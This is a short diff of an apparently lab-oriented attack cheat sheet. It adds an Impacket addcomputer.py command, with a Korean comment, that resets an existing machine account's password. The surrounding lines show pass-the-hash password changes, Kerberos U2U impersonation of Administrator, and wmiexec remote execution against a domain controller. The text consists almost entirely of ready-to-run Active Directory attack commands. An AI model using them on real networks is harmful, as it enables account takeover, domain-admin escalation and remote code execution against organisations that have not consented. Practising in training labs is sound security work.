@@ -240,6 +240,9 @@ impacket-describeTicket beth.richards.ccache | grep 'Ticket Session Key'
 
 changepasswd.py INLANEFREIGHT.LOCAL/beth.richards@10.129.205.35 -hashes :de3d16603d7ded97bb47cd6641b1a392 -newhash
 
+# 새로운 컴퓨터 추가 없이 비밀번호 변경
+addcomputer.py -computer-name 'ADMWS01$' -computer-pass '0xdf0xdf' -no-add -k -no-pass -dc-host BLN01.retro2.vl 'retro2.vl/FS01$'
+
 KRB5CCNAME=beth.richards.ccache getST.py -u2u -impersonate Administrator -spn TERMSRV/DC01.INLANEFREIGHT.LOCAL -no-pass INLANEFREIGHT.LOCAL/beth.richards -dc-ip 10.129.205.35
 
 KRB5CCNAME=Administrator@TERMSRV_DC01.INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL.ccache wmiexec.py DC01.INLANEFREIGHT.LOCAL -k -no-pass
